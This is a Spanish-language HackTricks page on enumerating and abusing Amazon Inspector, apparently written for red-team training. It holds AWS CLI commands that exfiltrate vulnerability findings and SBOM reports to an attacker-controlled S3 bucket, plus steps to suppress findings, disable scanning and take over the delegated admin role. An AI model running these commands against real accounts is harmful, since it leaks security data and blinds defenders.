# AWS - Inspector Enum

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Inspector

Amazon Inspector es un servicio avanzado y automatizado de gestión de vulnerabilidades diseñado para mejorar la seguridad de tu entorno de AWS. Este servicio escanea continuamente las instancias de Amazon EC2, las imágenes de contenedores en Amazon ECR, Amazon ECS y las funciones de AWS Lambda en busca de vulnerabilidades y exposiciones de red no deseadas. Al aprovechar una robusta base de datos de inteligencia de vulnerabilidades, Amazon Inspector proporciona hallazgos detallados, incluidos niveles de gravedad y recomendaciones de remedio, ayudando a las organizaciones a identificar y abordar proactivamente los riesgos de seguridad. Este enfoque integral garantiza una postura de seguridad fortificada en varios servicios de AWS, lo que ayuda en el cumplimiento y la gestión de riesgos.

## Elementos clave

### Hallazgos

Los hallazgos en Amazon Inspector son informes detallados sobre vulnerabilidades y exposiciones descubiertas durante el escaneo de instancias de EC2, repositorios de ECR o funciones de Lambda. Según su estado, los hallazgos se categorizan como:

- **Activo**: El hallazgo no ha sido remediado.
- **Cerrado**: El hallazgo ha sido remediado.
- **Suprimido**: El hallazgo ha sido marcado con este estado debido a una o más **reglas de supresión**.

Los hallazgos también se categorizan en los siguientes tres tipos:

- **Paquete**: Estos hallazgos se relacionan con vulnerabilidades en paquetes de software instalados en tus recursos. Ejemplos incluyen bibliotecas obsoletas o dependencias con problemas de seguridad conocidos.
- **Código**: Esta categoría incluye vulnerabilidades encontradas en el código de aplicaciones que se ejecutan en tus recursos de AWS. Los problemas comunes son errores de codificación o prácticas inseguras que podrían provocar brechas de seguridad.
- **Red**: Los hallazgos de red identifican exposiciones potenciales en las configuraciones de red que podrían ser explotadas por atacantes. Estos incluyen puertos abiertos, protocolos de red inseguros y grupos de seguridad mal configurados.

### Filtros y Reglas de Supresión

Los filtros y reglas de supresión en Amazon Inspector ayudan a gestionar y priorizar los hallazgos. Los filtros te permiten refinar los hallazgos en función de criterios específicos, como la gravedad o el tipo de recurso. Las reglas de supresión te permiten suprimir ciertos hallazgos que se consideran de bajo riesgo, que ya han sido mitigados, o por cualquier otro motivo importante, evitando que sobrecarguen tus informes de seguridad y permitiéndote centrarte en problemas más críticos.

### Lista de Materiales de Software (SBOM)

Una Lista de Materiales de Software (SBOM) en Amazon Inspector es una lista de inventario anidada exportable que detalla todos los componentes dentro de un paquete de software, incluidas bibliotecas y dependencias. Las SBOM ayudan a proporcionar transparencia en la cadena de suministro de software, lo que permite una mejor gestión de vulnerabilidades y cumplimiento. Son cruciales para identificar y mitigar los riesgos asociados con componentes de software de código abierto y de terceros.

## Funciones clave

### Exportar hallazgos

Amazon Inspector ofrece la capacidad de exportar hallazgos a Buckets de Amazon S3, Amazon EventBridge y AWS Security Hub, lo que te permite generar informes detallados de vulnerabilidades y exposiciones identificadas para un análisis adicional o para compartir en una fecha y hora específicas. Esta función admite varios formatos de salida como CSV y JSON, lo que facilita la integración con otras herramientas y sistemas. La funcionalidad de exportación permite la personalización de los datos incluidos en los informes, lo que te permite filtrar los hallazgos en función de criterios específicos como la gravedad, el tipo de recurso o el rango de fechas e incluir de forma predeterminada todos tus hallazgos en la Región de AWS actual con un estado Activo.

Al exportar hallazgos, es necesario un clave de Servicio de Administración de Claves (KMS) para cifrar los datos durante la exportación. Las claves de KMS garantizan que los hallazgos exportados estén protegidos contra accesos no autorizados, proporcionando una capa adicional de seguridad para la información de vulnerabilidades sensible.

### Escaneo de instancias de Amazon EC2

Amazon Inspector ofrece capacidades de escaneo robustas para las instancias de Amazon EC2 para detectar vulnerabilidades y problemas de seguridad. Inspector compara los metadatos extraídos de la instancia EC2 con reglas de avisos de seguridad para producir vulnerabilidades de paquetes y problemas de accesibilidad de red. Estos escaneos se pueden realizar a través de métodos **basados en agente** o **sin agente**, según la configuración de los ajustes del modo de escaneo de tu cuenta.

- **Basado en Agente**: Utiliza el agente de AWS Systems Manager (SSM) para realizar escaneos exhaustivos. Este método permite la recopilación y análisis exhaustivos de datos directamente desde la instancia.
- **Sin Agente**: Proporciona una alternativa ligera que no requiere instalar un agente en la instancia, creando una instantánea de EBS de cada volumen de la instancia EC2, buscando vulnerabilidades y luego eliminándola; aprovechando la infraestructura de AWS existente para el escaneo.

El modo de escaneo determina qué método se utilizará para realizar los escaneos de EC2:

- **Basado en Agente**: Implica instalar el agente SSM en las instancias de EC2 para una inspección profunda.
- **Escaneo Híbrido**: Combina métodos basados en agente y sin agente para maximizar la cobertura y minimizar el impacto en el rendimiento. En aquellas instancias de EC2 donde se haya instalado el agente SSM, Inspector realizará un escaneo basado en agente, y para aquellas donde no haya agente SSM, el escaneo realizado será sin agente.

Otra característica importante es la **inspección profunda** para las instancias de EC2 Linux. Esta función ofrece un análisis exhaustivo del software y la configuración de las instancias de EC2 Linux, proporcionando evaluaciones detalladas de vulnerabilidades, incluidas vulnerabilidades del sistema operativo, vulnerabilidades de aplicaciones y configuraciones incorrectas, garantizando una evaluación de seguridad integral. Esto se logra mediante la inspección de **rutas personalizadas** y todas sus subcarpetas. De forma predeterminada, Amazon Inspector escaneará lo siguiente, pero cada cuenta miembro puede definir hasta 5 rutas personalizadas más, y cada administrador delegado hasta 10:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Escaneo de imágenes de contenedores de Amazon ECR

Amazon Inspector proporciona capacidades de escaneo robustas para las imágenes de contenedores de Amazon Elastic Container Registry (ECR), asegurando que las vulnerabilidades de paquetes se detecten y gestionen eficientemente.

- **Escaneo Básico**: Este es un escaneo rápido y ligero que identifica vulnerabilidades conocidas en paquetes de SO en imágenes de contenedores utilizando un conjunto estándar de reglas del proyecto de código abierto Clair. Con esta configuración de escaneo, tus repositorios se escanearán al realizar un push, o al realizar escaneos manuales.
- **Escaneo Mejorado**: Esta opción agrega la función de escaneo continuo además del escaneo al realizar un push. El escaneo mejorado profundiza en las capas de cada imagen de contenedor para identificar vulnerabilidades en paquetes de SO y en paquetes de lenguajes de programación con mayor precisión. Analiza tanto la imagen base como cualquier capa adicional, proporcionando una vista integral de posibles problemas de seguridad.

### Escaneo de funciones de Lambda de Amazon

Amazon Inspector incluye capacidades de escaneo exhaustivas para las funciones de Lambda de AWS y sus capas, garantizando la seguridad y la integridad de las aplicaciones sin servidor. Inspector ofrece dos tipos de escaneo para las funciones de Lambda:

- **Escaneo estándar de Lambda**: Esta función predeterminada identifica vulnerabilidades de software en las dependencias del paquete de la aplicación agregadas a tu función de Lambda y sus capas. Por ejemplo, si tu función utiliza una versión de una biblioteca como python-jwt con una vulnerabilidad conocida, genera un hallazgo.
- **Escaneo de código Lambda**: Analiza el código de la aplicación personalizado en busca de problemas de seguridad, detectando vulnerabilidades como fallas de inyección, fugas de datos, criptografía débil y falta de cifrado. Captura fragmentos de código que resaltan las vulnerabilidades detectadas, como credenciales codificadas. Los hallazgos incluyen sugerencias detalladas de remedio y fragmentos de código para solucionar los problemas.
### **Escaneos del Center for Internet Security (CIS)**

Amazon Inspector incluye escaneos del CIS para comparar los sistemas operativos de las instancias de Amazon EC2 con las recomendaciones de las mejores prácticas del Center for Internet Security (CIS). Estos escaneos garantizan que las configuraciones cumplan con los estándares de seguridad basados en la industria.

- **Configuración**: Los escaneos del CIS evalúan si las configuraciones del sistema cumplen con recomendaciones específicas del CIS Benchmark, con cada verificación vinculada a un ID y título de verificación del CIS.
- **Ejecución**: Los escaneos se realizan o programan en función de las etiquetas de las instancias y los horarios definidos.
- **Resultados**: Los resultados posteriores al escaneo indican qué verificaciones se aprobaron, se omitieron o fallaron, proporcionando información sobre la postura de seguridad de cada instancia.

## Enumeración
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## Post Explotación

{% hint style="success" %}
Desde la perspectiva de un atacante, este servicio puede ayudar al atacante a encontrar vulnerabilidades y exposiciones de red que podrían ayudarlo a comprometer otras instancias/contenedores.

Sin embargo, un atacante también podría estar interesado en interrumpir este servicio para que la víctima no pueda ver vulnerabilidades (todas o específicas).
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Un atacante podría generar informes detallados de vulnerabilidades o listas de materiales de software (SBOM) y extraerlos de su entorno de AWS. Esta información podría ser explotada para identificar debilidades específicas, software desactualizado o dependencias inseguras, lo que permitiría ataques dirigidos.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
El siguiente ejemplo muestra cómo exfiltrar todos los hallazgos activos de Amazon Inspector a un Bucket de Amazon S3 controlado por un atacante con una clave KMS de Amazon controlada por un atacante:

1. **Crear un Bucket de Amazon S3** y adjuntar una política para que sea accesible desde Amazon Inspector de la víctima:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Crear una clave Amazon KMS** y adjuntar una política a la misma para que pueda ser utilizada por el Amazon Inspector de la víctima:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. Ejecuta el comando para **crear el informe de hallazgos** exfiltrándolo:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Impacto Potencial**: Generación y exfiltración de informes detallados de vulnerabilidades y software, obteniendo información sobre vulnerabilidades específicas y debilidades de seguridad.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Un atacante podría cancelar la generación del informe de hallazgos especificado o del informe SBOM, impidiendo que los equipos de seguridad reciban información oportuna sobre vulnerabilidades y listas de materiales de software (SBOM), retrasando la detección y corrección de problemas de seguridad.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Impacto Potencial**: Interrupción de la monitorización de seguridad y prevención de la detección oportuna y la corrección de problemas de seguridad.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Un atacante con estos permisos podría manipular las reglas de filtrado que determinan qué vulnerabilidades y problemas de seguridad se informan o se suprimen (si la **acción** está configurada en SUPRIMIR, se crearía una regla de supresión). Esto podría ocultar vulnerabilidades críticas a los administradores de seguridad, facilitando la explotación de estas debilidades sin ser detectadas. Al alterar o eliminar filtros importantes, un atacante también podría crear ruido inundando el sistema con hallazgos irrelevantes, obstaculizando la monitorización y respuesta efectiva de seguridad.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Impacto Potencial**: Ocultamiento o supresión de vulnerabilidades críticas, o inundación del sistema con hallazgos irrelevantes.

### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Un atacante podría perturbar significativamente la estructura de gestión de seguridad.

- Al deshabilitar la cuenta de administrador delegado, el atacante podría evitar que el equipo de seguridad acceda y gestione la configuración e informes de Amazon Inspector.
- Habilitar una cuenta de administrador no autorizada permitiría a un atacante controlar las configuraciones de seguridad, potencialmente deshabilitando escaneos o modificando ajustes para ocultar actividades maliciosas.

{% hint style="warning" %}

Es necesario que la cuenta no autorizada esté en la misma Organización que la víctima para convertirse en el administrador delegado.

Para que la cuenta no autorizada se convierta en el administrador delegado, también es necesario que después de deshabilitar al administrador delegado legítimo, y antes de habilitar a la cuenta no autorizada como administrador delegado, el administrador legítimo debe ser dado de baja como administrador delegado de la organización. Esto se puede hacer con el siguiente comando (se requiere el permiso **`organizations:DeregisterDelegatedAdministrator`**): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **Impacto Potencial**: Disrupción de la gestión de seguridad.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Un atacante podría manipular la asociación de cuentas miembro dentro de una organización de Amazon Inspector. Al asociar cuentas no autorizadas o desasociar cuentas legítimas, un atacante podría controlar qué cuentas se incluyen en escaneos de seguridad e informes. Esto podría llevar a que cuentas críticas sean excluidas del monitoreo de seguridad, lo que permitiría al atacante explotar vulnerabilidades en esas cuentas sin ser detectado.

{% hint style="warning" %}

Esta acción debe ser realizada por el administrador delegado.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **Impacto Potencial**: Exclusión de cuentas clave de los escaneos de seguridad, permitiendo la explotación no detectada de vulnerabilidades.

### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

Un atacante con el permiso `inspector2:Disable` podría desactivar los escaneos de seguridad en tipos de recursos específicos (EC2, ECR, Lambda, código de Lambda) sobre las cuentas especificadas, dejando partes del entorno de AWS sin monitoreo y vulnerables a ataques. Además, al poseer los permisos **`inspector2:Enable`** y **`iam:CreateServiceLinkedRole`**, un atacante podría luego reactivar los escaneos selectivamente para evitar la detección de configuraciones sospechosas.

{% hint style="warning" %}
Esta acción debe ser realizada por el administrador delegado.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **Impacto Potencial**: Creación de puntos ciegos en la monitorización de seguridad.

### `inspector2:UpdateOrganizationConfiguration`

Un atacante con este permiso podría actualizar las configuraciones de tu organización de Amazon Inspector, afectando las características de escaneo predeterminadas habilitadas para las nuevas cuentas de miembros.

{% hint style="warning" %}

Esta acción debe ser realizada por el administrador delegado.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Impacto Potencial**: Alterar políticas y configuraciones de escaneo de seguridad para la organización.

### `inspector2:TagResource`, `inspector2:UntagResource`

Un atacante podría manipular etiquetas en los recursos de AWS Inspector, que son críticas para organizar, rastrear y automatizar evaluaciones de seguridad. Al alterar o eliminar etiquetas, un atacante podría potencialmente ocultar vulnerabilidades de los escaneos de seguridad, interrumpir informes de cumplimiento e interferir con procesos de remediación automatizados, lo que podría llevar a problemas de seguridad no verificados y comprometer la integridad del sistema.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Impacto Potencial**: Ocultamiento de vulnerabilidades, interrupción de informes de cumplimiento, interrupción de automatización de seguridad e interrupción de asignación de costos.

# Referencias
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
